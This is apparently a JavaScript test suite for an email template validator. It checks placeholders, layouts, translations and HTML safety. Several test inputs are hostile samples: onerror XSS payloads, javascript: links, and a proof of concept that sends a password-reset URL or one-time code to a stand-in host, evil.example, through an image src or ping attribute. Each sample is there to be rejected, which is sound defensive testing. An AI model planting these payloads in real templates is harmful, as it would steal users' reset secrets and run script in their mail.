'use strict';

// src/services/mail/template-validation.js: what a template or layout must be
// before the store keeps it.
const test = require('node:test');
const assert = require('node:assert/strict');
const { validateTemplate, validateLayout, validateTranslation } = require('../src/services/mail/template-validation');
const { SEEDS, englishTemplate } = require('../src/db/email-template-seeds');
const { ACTIONS } = require('../src/services/mail/actions');

const LAYOUT = { html: '<div>{{#if preheader}}<span>{{preheader}}</span>{{/if}}{{content}}<p>{{why}}</p></div>', text: '{{content}}' };
const otp = (extra) => ({ name: 'Code', subject: 'Your code', preheader: '', why: 'You asked', html: '<p>{{code}}</p>', text: 'Code: {{code}}', ...extra });
const errorsOf = (result) => (result.ok ? [] : result.errors);
const hasError = (result, field, pattern) => assert.ok(
  errorsOf(result).some((e) => e.field === field && pattern.test(e.message)),
  `expected a ${field} error matching ${pattern}, got ${JSON.stringify(errorsOf(result))}`);

test('every first template and the standard layout validate as seeded', () => {
  const layout = SEEDS.layouts[0];
  assert.deepEqual(validateLayout({ name: layout.name, html: layout.html, text: layout.text }, []), { ok: true });
  for (const kind of Object.keys(ACTIONS)) {
    const t = englishTemplate(kind);
    assert.deepEqual(validateTemplate(kind, t, layout), { ok: true }, kind);
  }
});

test('a valid template passes, with or without a layout', () => {
  assert.deepEqual(validateTemplate('otp', otp(), LAYOUT), { ok: true });
  assert.deepEqual(validateTemplate('otp', otp(), null), { ok: true });
});

test('an unknown action is refused', () => {
  hasError(validateTemplate('nope', otp(), LAYOUT), 'action', /what this email is for/);
});

test('empty subject, html or text is refused, and a blank name too', () => {
  hasError(validateTemplate('otp', otp({ subject: '  ' }), LAYOUT), 'subject', /cannot be empty/);
  hasError(validateTemplate('otp', otp({ text: '' }), LAYOUT), 'text', /cannot be empty/);
  hasError(validateTemplate('otp', otp({ html: undefined }), LAYOUT), 'html', /cannot be empty/);
  hasError(validateTemplate('otp', otp({ name: ' ' }), LAYOUT), 'name', /cannot be empty/);
});

test('a template that does not parse names the field and the problem', () => {
  hasError(validateTemplate('otp', otp({ html: '<p>{{#if code}}{{code}}</p>' }), LAYOUT), 'html', /never closed/);
  hasError(validateTemplate('otp', otp({ subject: 'Code {{code' }), LAYOUT), 'subject', /Unclosed/);
});

test('unknown placeholders are refused, naming what the email can use', () => {
  const result = validateTemplate('otp', otp({ html: '<p>{{code}} {{name}}</p>' }), LAYOUT);
  hasError(result, 'html', /\{\{name\}\}/);
  hasError(result, 'html', /\{\{code\}\}/);
});

test('a required placeholder must be printed in both forms, inside a condition or not', () => {
  hasError(validateTemplate('otp', otp({ html: '<p>Hello</p>' }), LAYOUT), 'html', /\{\{code\}\}/);
  hasError(validateTemplate('otp', otp({ text: 'Hello' }), LAYOUT), 'text', /\{\{code\}\}/);
  hasError(validateTemplate('otp', otp({ html: '<p>{{#if code}}yes{{/if}}</p>' }), LAYOUT), 'html', /\{\{code\}\}/);
  assert.deepEqual(validateTemplate('waitlist_joined', { ...otp(), html: '{{#if hasCode}}<p>{{code}}</p>{{/if}}', text: '{{#if hasCode}}{{code}}{{/if}}' }, LAYOUT), { ok: true });
});

test('required placeholders count across the template and the layout it wears', () => {
  const inWhy = { name: 'Opened', subject: 'Opened', preheader: '', why: 'Stop: <a href="{{unsubscribeUrl}}">here</a>', html: '<p>Opened</p>', text: 'Opened {{unsubscribeUrl}}' };
  assert.deepEqual(validateTemplate('project_opened', inWhy, LAYOUT), { ok: true });
  hasError(validateTemplate('project_opened', inWhy, { html: '{{content}}', text: '{{content}}' }), 'html', /\{\{unsubscribeUrl\}\}/);
  hasError(validateTemplate('project_opened', inWhy, null), 'html', /\{\{unsubscribeUrl\}\}/);
});

test('unsafe HTML is refused on the field that carries it', () => {
  hasError(validateTemplate('otp', otp({ html: '<p onclick="x">{{code}}</p>' }), LAYOUT), 'html', /onclick/);
  hasError(validateTemplate('otp', otp({ why: '<script>x</script>' }), LAYOUT), 'why', /script/);
  hasError(validateTemplate('otp', otp({ preheader: '<a href="javascript:x">a</a>' }), LAYOUT), 'preheader', /script or data/);
});

test('placeholders in attributes: links only in a quoted href, never code wording or HTML', () => {
  const opened = (html) => ({ name: 'Opened', subject: 'Opened', preheader: '', why: '', html: `${html}<a href="{{unsubscribeUrl}}">stop</a>`, text: '{{unsubscribeUrl}}' });
  assert.deepEqual(validateTemplate('project_opened', opened('<a href="{{url}}" title="{{app}}">go</a>'), LAYOUT), { ok: true });
  hasError(validateTemplate('project_opened', opened('<a href={{url}}>go</a>'), LAYOUT), 'html', /quoted/);
  hasError(validateTemplate('project_opened', opened('<a href="{{app}}">go</a>'), LAYOUT), 'html', /not a link/);
  hasError(validateTemplate('project_opened', opened('<p style="color:{{app}}">x</p>'), LAYOUT), 'html', /style/);
  hasError(validateTemplate('project_opened', opened('<p {{app}}>x</p>'), LAYOUT), 'html', /inside a tag/);
  hasError(validateTemplate('project_opened', opened('<p {{#if hasApp}}hidden{{/if}}>x</p>'), LAYOUT), 'html', /inside a tag/);
  hasError(validateTemplate('project_opened', opened('<p title="{{#if hasApp}}x{{/if}}">x</p>'), LAYOUT), 'html', /condition/);
  hasError(validateTemplate('project_opened', opened('<{{#if hasApp}}b{{/if}}>x'), LAYOUT), 'html', /tag/);
  hasError(validateTemplate('project_opened', opened('<style>p{color:{{app}}}</style>'), LAYOUT), 'html', /style/);
  const ready = (html) => ({ name: 'Ready', subject: '{{subject}}', preheader: '', why: '', html: `${html}<a href="{{unsubscribeUrl}}">stop</a>`, text: '{{unsubscribeUrl}}' });
  assert.deepEqual(validateTemplate('build_ready', ready('<p>{{lead}} {{app}}</p>'), LAYOUT), { ok: true });
  hasError(validateTemplate('build_ready', ready('<img src="https://x.example/a.png" alt="{{app}}">'), LAYOUT), 'html', /inserted as HTML/);
  hasError(validateTemplate('build_ready', ready('<p title="{{lead}}">x</p>'), LAYOUT), 'html', /inserted as HTML/);
  hasError(validateTemplate('build_ready', ready('<p title="{{subject}}">x</p>'), LAYOUT), 'html', /built in code/);
});

test('a layout needs {{content}} in both forms, outside any condition, and only its own placeholders', () => {
  assert.deepEqual(validateLayout({ name: 'L', ...LAYOUT }, []), { ok: true });
  hasError(validateLayout({ name: 'L', html: '<div></div>', text: '{{content}}' }, []), 'html', /\{\{content\}\}/);
  hasError(validateLayout({ name: 'L', html: '{{content}}', text: 'x' }, []), 'text', /\{\{content\}\}/);
  hasError(validateLayout({ name: 'L', html: '{{#if why}}{{content}}{{/if}}', text: '{{content}}' }, []), 'html', /outside/);
  hasError(validateLayout({ name: 'L', html: '{{content}}{{code}}', text: '{{content}}' }, []), 'html', /\{\{code\}\}/);
  hasError(validateLayout({ name: 'L', html: '<a href="{{why}}">x</a>{{content}}', text: '{{content}}' }, []), 'html', /attribute/);
  hasError(validateLayout({ name: 'L', html: '<iframe></iframe>{{content}}', text: '{{content}}' }, []), 'html', /iframe/);
  hasError(validateLayout({ name: '', ...LAYOUT }, []), 'name', /cannot be empty/);
});

test('a layout change that breaks a template using it names that template', () => {
  const inWhy = { id: 7, action: 'project_opened', name: 'Opened, stop link in why', subject: 'Opened', preheader: '', why: '<a href="{{unsubscribeUrl}}">stop</a>', html: '<p>Opened</p>', text: '{{unsubscribeUrl}}' };
  const result = validateLayout({ name: 'L', html: '{{content}}', text: '{{content}}' }, [inWhy]);
  assert.equal(result.ok, false);
  hasError(result, 'html', /Opened, stop link in why/);
  hasError(result, 'html', /\{\{unsubscribeUrl\}\}/);
  assert.deepEqual(result.templates, [{ id: 7, action: 'project_opened', name: 'Opened, stop link in why' }]);
});

test('a template whose framed result is over the size limit is refused', () => {
  const big = { html: `<div>${'x'.repeat(90 * 1024)}{{content}}</div>`, text: '{{content}}' };
  hasError(validateTemplate('otp', otp({ html: `<p>{{code}}${'y'.repeat(20 * 1024)}</p>` }), big), 'html', /100 KB/);
});

test('a translation is held to the same rules as its template', () => {
  assert.deepEqual(validateTranslation('otp', otp({ name: undefined }), LAYOUT), { ok: true });
  hasError(validateTranslation('otp', otp({ subject: '' }), LAYOUT), 'subject', /cannot be empty/);
  hasError(validateTranslation('otp', otp({ text: 'Votre code' }), LAYOUT), 'text', /\{\{code\}\}/);
});

test('a condition cannot open or close a raw-text element in one branch only', () => {
  const opened = (html) => ({ name: 'Opened', subject: 'Opened', preheader: '', why: '', html: `${html}<a href="{{unsubscribeUrl}}">stop</a>`, text: '{{unsubscribeUrl}}' });
  hasError(validateTemplate('project_opened', opened('<style>p{}{{#if hasApp}}</style>{{/if}}<p>x</p>'), LAYOUT), 'html', /condition|style/);
  hasError(validateTemplate('project_opened', opened('<title>{{#if hasApp}}x{{/if}}</title>'), LAYOUT), 'html', /condition/);
  hasError(validateTemplate('project_opened', opened('<textarea>{{else}}</textarea>'), LAYOUT), 'html', /./);
  hasError(validateTemplate('project_opened', opened('{{#if hasApp}}<style>{{/if}}<p>x</p></style>'), LAYOUT), 'html', /style/);
  hasError(validateTemplate('project_opened', opened('{{#unless hasApp}}</title>{{/unless}}'), LAYOUT), 'html', /title/);
  assert.deepEqual(validateTemplate('project_opened', opened('<title>Opened</title>{{#if hasApp}}<p>{{app}}</p>{{/if}}'), LAYOUT), { ok: true });
});

test('every branch of the conditions renders to safe HTML', () => {
  const opened = (html) => ({ name: 'Opened', subject: 'Opened', preheader: '', why: '', html: `${html}<a href="{{unsubscribeUrl}}">stop</a>`, text: '{{unsubscribeUrl}}' });
  // Only the path with hasApp true closes the title early and lets a tag out.
  hasError(validateTemplate('project_opened', opened('<title>x{{#if hasApp}}</title><iframe>{{/if}}</title>'), LAYOUT), 'html', /./);
  hasError(validateTemplate('project_opened', opened('<a href="https://x.example/{{#if hasApp}}a{{/if}}">x</a>'), LAYOUT), 'html', /condition/);
  const { branchProblem } = require('../src/services/mail/template-validation');
  assert.match(branchProblem('{{#if a}}<style>{{/if}}<p>x</p>{{#unless a}}</style>{{/unless}}@import "y";'), /@import|style/);
  assert.equal(branchProblem('{{#if a}}<p>{{a}}</p>{{else}}<i>none</i>{{/if}}'), null);
  hasError(validateLayout({ name: 'L', html: '{{content}}{{#if why}}<style>{{/if}}', text: '{{content}}' }, []), 'html', /style/);
});

test('a required placeholder counts only where it is sure to print', () => {
  const t = (o) => ({ name: 'n', subject: 's', preheader: '', why: '', ...o });
  hasError(validateTemplate('project_opened', t({ html: '<p>Hi</p>{{#if hasApp}}<a href="{{unsubscribeUrl}}">Unsub</a>{{/if}}', text: 'Hi {{#if hasApp}}{{unsubscribeUrl}}{{/if}}' }), null), 'html', /\{\{unsubscribeUrl\}\}/);
  hasError(validateTemplate('otp', t({ html: '<p>{{#unless code}}{{code}}{{/unless}}</p>', text: '{{#unless code}}{{code}}{{/unless}}' }), null), 'html', /\{\{code\}\}/);
  const gated = { html: '<div>{{content}}{{#if preheader}}{{why}}{{/if}}</div>', text: '{{content}}\n{{#if preheader}}{{why}}{{/if}}' };
  hasError(validateTemplate('project_opened', t({ html: '<p>Hi</p>', text: 'Hi {{unsubscribeUrl}}', why: '<a href="{{unsubscribeUrl}}">u</a>' }), gated), 'html', /\{\{unsubscribeUrl\}\}/);
  hasError(validateTemplate('otp', t({ html: '<!-- {{code}} --><p>x</p>', text: '{{code}}' }), null), 'html', /comment/);
  // The same name, a flag that means the same, or both branches: sure.
  assert.deepEqual(validateTemplate('otp', t({ html: '{{#if code}}<p>{{code}}</p>{{/if}}', text: '{{code}}' }), null), { ok: true });
  assert.deepEqual(validateTemplate('project_opened', t({ html: '{{#if hasUnsubscribeUrl}}<a href="{{unsubscribeUrl}}">u</a>{{/if}}', text: '{{unsubscribeUrl}}' }), null), { ok: true });
  assert.deepEqual(validateTemplate('project_opened', t({ html: '{{#if hasApp}}<a href="{{unsubscribeUrl}}">u</a>{{else}}<a href="{{unsubscribeUrl}}">stop</a>{{/if}}', text: '{{unsubscribeUrl}}' }), null), { ok: true });
  assert.deepEqual(validateTemplate('project_opened', t({ html: '<p>Hi</p>', text: 'Hi {{unsubscribeUrl}}', why: '<a href="{{unsubscribeUrl}}">u</a>' }), { html: '{{content}}{{#if why}}<p>{{why}}</p>{{/if}}', text: '{{content}}' }), { ok: true });
});

test('conditions can hide nothing from the check: no markers in comments, and at most 8 names a field', () => {
  const names = ['url', 'hasAccount', 'hasSignInLink', 'needsCodeNote', 'hasIos', 'iosLink', 'hasAndroid', 'androidLink', 'hasMobile'];
  assert.equal(names.length, 9);
  const openers = '{{#if hasAccount}}<!x{{/if}}{{#unless hasSignInLink}}<!x{{/unless}}{{#if needsCodeNote}}<!x{{/if}}{{#unless hasIos}}<!x{{/unless}}'
    + '{{#if url}}{{/if}}{{#if iosLink}}{{/if}}{{#if hasAndroid}}{{/if}}{{#if androidLink}}{{/if}}{{#if hasMobile}}{{/if}}';
  const html = '<p><a href="{{url}}">Sign in</a></p>' + openers + ' <img src="https://x.test/a.png" onerror="alert(1)">';
  const result = validateTemplate('waitlist_released', { name: 'n', subject: 's', preheader: '', why: '', html, text: '{{url}}' }, null);
  hasError(result, 'html', /comment/);
  const many = names.map((n) => `{{#if ${n}}}<b>${n}</b>{{/if}}`).join('');
  hasError(validateTemplate('waitlist_released', { name: 'n', subject: 's', preheader: '', why: '', html: `<a href="{{url}}">x</a>${many}`, text: '{{url}}' }, null), 'html', /more than 8/);
});

test('nothing in a title or textarea may be a placeholder', () => {
  const opened = (html) => ({ name: 'n', subject: 's', preheader: '', why: '', html: `${html}<a href="{{unsubscribeUrl}}">stop</a>`, text: '{{unsubscribeUrl}}' });
  hasError(validateTemplate('project_opened', opened('<title>x</tit{{app}}<img src=x onerror=1></title>'), LAYOUT), 'html', /title/);
  hasError(validateTemplate('project_opened', opened('<textarea>{{app}}</textarea>'), LAYOUT), 'html', /textarea/);
});

test('an error that is not a template mistake is not shown to the admin', (t) => {
  const render = require('../src/services/mail/render');
  const log = require('../src/services/logger');
  const logged = t.mock.method(log, 'error', () => {});
  t.mock.method(render, 'renderMessage', () => { throw new Error('internal detail /srv/app'); });
  const result = validateTemplate('otp', otp(), LAYOUT);
  assert.equal(result.ok, false);
  assert.ok(result.errors.every((e) => !e.message.includes('internal detail')));
  assert.equal(logged.mock.callCount(), 1);
});

test('a part that ends inside a tag, declaration or raw-text element is refused, on any branch', () => {
  const L2 = { name: 'L2', html: '<div>{{content}}{{why}}</div>', text: '{{content}}\n{{why}}' };
  const p4 = { name: 'T', subject: 'Opened', preheader: '', why: '{{#unless hasApp}}img src=x onerror=alert(1)//{{/unless}}', html: '<p>Hi</p><a href="{{unsubscribeUrl}}">stop</a><', text: 'Hi {{unsubscribeUrl}}' };
  hasError(validateTemplate('project_opened', p4, L2), 'html', /ends with a "<"/);
  const L3 = { name: 'L', html: '<div>{{content}}{{why}}<p title="><img src=x onerror=alert(1)>">.</p></div>', text: '{{content}}\n{{why}}' };
  const p3 = { name: 'T', subject: 'Opened', preheader: '', why: '{{#if hasApp}}<b>About {{app}}</b>{{/if}}', html: '<p>Hi</p><a href="{{unsubscribeUrl}}">stop</a><!x', text: 'Hi {{unsubscribeUrl}}' };
  hasError(validateTemplate('project_opened', p3, L3), 'html', /unfinished/);
  const broke = validateLayout(L3, [{ ...p3, action: 'project_opened', id: 1 }]);
  hasError(broke, 'html', /"T"/);
  const standard = SEEDS.layouts[0];
  hasError(validateTemplate('otp', otp({ preheader: 'Your code<style>' }), standard), 'preheader', /<style>/);
  hasError(validateTemplate('otp', otp({ preheader: 'Your code<!x' }), standard), 'preheader', /unfinished/);
  const swallow = { name: 'T', subject: 's', preheader: '', why: '<a href="{{unsubscribeUrl}}">Unsubscribe</a>', html: '<p>Hi</p><!x', text: 'Hi {{unsubscribeUrl}}' };
  hasError(validateTemplate('project_opened', swallow, L2), 'html', /unfinished/);
  hasError(validateTemplate('project_opened', { ...swallow, html: '<p>Hi</p>{{#if hasApp}}<{{/if}}' }, L2), 'html', /tag/);
  hasError(validateLayout({ name: 'L', html: '{{content}}<title>', text: '{{content}}' }, []), 'html', /title/);
});

test('the framed mail is checked on every path, not only the sample', () => {
  const { framedPathsProblem } = require('../src/services/mail/template-validation');
  const L2 = { html: '<div>{{content}}{{why}}</div>', text: '{{content}}' };
  const text = { preheader: '', why: '{{#unless hasApp}}img src=x onerror=alert(1)//{{/unless}}', html: '<p>Hi</p><' };
  assert.match(framedPathsProblem(text, L2), /hasApp is false[\s\S]*onerror/);
  assert.equal(framedPathsProblem({ preheader: '', why: '{{#if hasApp}}<b>{{app}}</b>{{/if}}', html: '<p>Hi</p>' }, L2), null);
  const many = ['a', 'b', 'c', 'd', 'e'].map((n) => `{{#if ${n}}}x{{/if}}`).join('');
  const more = ['f', 'g', 'h', 'i'].map((n) => `{{#if ${n}}}x{{/if}}`).join('');
  assert.match(framedPathsProblem({ html: many, why: more, preheader: '' }, L2), /more than 8/);
});

test('probe p7: character references, hiding containers and unbalanced parts', () => {
  const t = (o) => ({ name: 'n', subject: 's', preheader: '', why: '', ...o });
  const STD = { html: '<div>{{#if preheader}}<div style="display:none">{{preheader}}</div>{{/if}}{{content}}<div>Homeroom<br>{{why}}</div></div>', text: '{{content}}\n{{why}}' };
  const L = (h) => validateLayout({ name: 'l', html: h, text: '{{content}}' }, []);
  hasError(validateTemplate('otp', t({ html: '<p>Your code: &#{{code}}</p>', text: '{{code}}' }), STD), 'html', /&/);
  hasError(validateTemplate('otp', t({ html: '<p>Your code: &#x{{code}}</p>', text: '{{code}}' }), STD), 'html', /&/);
  hasError(validateTemplate('otp', t({ html: '<p>&amp{{code}}</p>', text: '{{code}}' }), STD), 'html', /&/);
  hasError(L('&#{{content}}'), 'html', /&/);
  assert.deepEqual(validateTemplate('otp', t({ html: '<p>Code &amp; more: {{code}}</p>', text: '{{code}}' }), STD), { ok: true });
  hasError(validateTemplate('project_opened', t({ html: '<p>Hi</p><template>', why: '<a href="{{unsubscribeUrl}}">Unsubscribe</a>', text: '{{unsubscribeUrl}}' }), STD), 'html', /template/);
  hasError(L('<template>{{why}}</template>{{content}}'), 'html', /template/);
  hasError(validateTemplate('otp', t({ html: '<p>{{code}}</p><select>', text: '{{code}}' }), STD), 'html', /select/);
  hasError(validateTemplate('otp', t({ preheader: '</div><p>visible</p>', html: '<p>{{code}}</p>', text: '{{code}}' }), STD), 'preheader', /did not open/);
  hasError(validateTemplate('otp', t({ preheader: 'x<div style="display:none">', html: '<p>{{code}}</p>', text: '{{code}}' }), STD), 'preheader', /open/);
  hasError(L('{{#if why}}<a href="https://a.test/">{{/if}}{{content}}'), 'html', /<a>/);
});

test('the required check sees the code as a reader would, references decoded', () => {
  const { requiredOnEveryPath } = require('../src/services/mail/template-validation');
  const { actionFor } = require('../src/services/mail/actions');
  const fields = { subject: 's', preheader: '', why: '', html: '<p>&#{{code}}</p>', text: '{{code}}' };
  assert.match(requiredOnEveryPath(actionFor('otp'), fields, null).message, /\{\{code\}\}/);
  assert.equal(requiredOnEveryPath(actionFor('otp'), { ...fields, html: '<p>{{code}}</p>' }, null), null);
});

test('a link placeholder cannot hand its one-time secret to another site', () => {
  const reset = englishTemplate('password_reset');
  const layout = SEEDS.layouts[0];
  const withHtml = (extra) => ({ ...reset, html: `${reset.html}${extra}` });
  // The reviewer's proof of concept: an image the mail client fetches on open.
  hasError(validateTemplate('password_reset', withHtml('<p><img src="https://evil.example/p.gif?u={{url}}" alt=""></p>'), layout), 'html', /only go in href/);
  hasError(validateTemplate('password_reset', withHtml('<p><img src="{{url}}" alt=""></p>'), layout), 'html', /only go in href, not in src/);
  hasError(validateTemplate('password_reset', withHtml('<p><a href="https://evil/?u={{url}}">x</a></p>'), layout), 'html', /whole href value/);
  hasError(validateTemplate('password_reset', withHtml('<p><a href="{{url}}" ping="https://evil/?c={{url}}">x</a></p>'), layout), 'html', /not in ping/);
  for (const attr of ['srcset', 'background', 'poster']) {
    hasError(validateTemplate('password_reset', withHtml(`<p><a href="{{url}}" ${attr}="{{url}}">x</a></p>`), layout), 'html', new RegExp(`not in ${attr}`));
  }
  const otp = englishTemplate('otp');
  hasError(validateTemplate('otp', { ...otp, html: `${otp.html}<p><a href="https://x.example/" ping="https://evil/?c={{code}}">x</a></p>` }, layout), 'html', /Only a link placeholder can go in ping/);
  // The whole value, space around it allowed.
  assert.deepEqual(validateTemplate('password_reset', withHtml('<p><a href=" {{url}} ">again</a></p>'), layout), { ok: true });
});

test('in the text version a link placeholder cannot be joined into a longer address', () => {
  const reset = englishTemplate('password_reset');
  const layout = SEEDS.layouts[0];
  const withText = (extra) => ({ ...reset, text: `${reset.text}${extra}` });
  const joined = /cannot touch a letter, digit or URL character/;
  for (const bad of ['\nhttps://evil.example/?u={{url}}', '\n?u={{url}}', '\nx{{url}}', '\n{{url}}x', '\n{{url}}/x', '\n{{#if url}}?u={{/if}}{{url}}']) {
    hasError(validateTemplate('password_reset', withText(bad), layout), 'text', joined);
  }
  // Text mail fetches nothing, so any character that cannot continue a URL is
  // fine, as Japanese, Chinese and Korean translations write it.
  for (const ok of ['\n\u3053\u3061\u3089{{url}}', '\n\u8be6\u60c5\uff1a{{url}}', '\nAgain: {{url}}', '\n({{url}})']) {
    assert.deepEqual(validateTemplate('password_reset', withText(ok), layout), { ok: true }, ok);
  }
  const invite = englishTemplate('project_invite');
  hasError(validateTemplate('project_invite', { ...invite, text: `${invite.text}\n{{inviter}}{{url}}` }, layout), 'text', joined);
});
